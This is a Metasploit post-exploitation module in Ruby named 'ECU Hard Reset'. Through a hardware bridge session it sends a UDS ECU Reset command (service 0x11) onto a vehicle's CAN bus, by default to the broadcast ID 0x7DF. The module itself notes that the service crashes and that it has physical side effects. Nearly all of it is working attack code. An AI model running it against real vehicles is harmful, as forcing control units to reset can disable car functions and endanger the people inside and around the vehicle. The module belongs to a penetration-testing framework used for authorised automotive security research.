##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ECU Hard Reset',
        'Description' => ' This module performs hard reset in the ECU Reset Service Identifier (0x11)',
        'License' => MSF_LICENSE,
        'Author' => ['Jay Turla'],
        'Platform' => ['hardware'],
        'SessionTypes' => ['hwbridge'],
        'Notes' => {
          'Stability' => [ CRASH_SERVICE_RESTARTS ],
          'SideEffects' => [ PHYSICAL_EFFECTS ],
          'Reliability' => [ ]
        }
      )
    )
    register_options([
      OptString.new('ARBID', [false, 'CAN ID to perform ECU Hard Reset', '0x7DF']),
      OptString.new('CANBUS', [false, 'CAN Bus to perform scan on, defaults to connected bus', nil])
    ])
  end

  def run
    unless client.automotive
      print_error('The hwbridge requires a functional automotive extention')
      return
    end
    print_status('Performing ECU Hard Reset...')
    client.automotive.cansend(datastore['CANBUS'], datastore['ARBID'], '0211010000000000')
  end

end
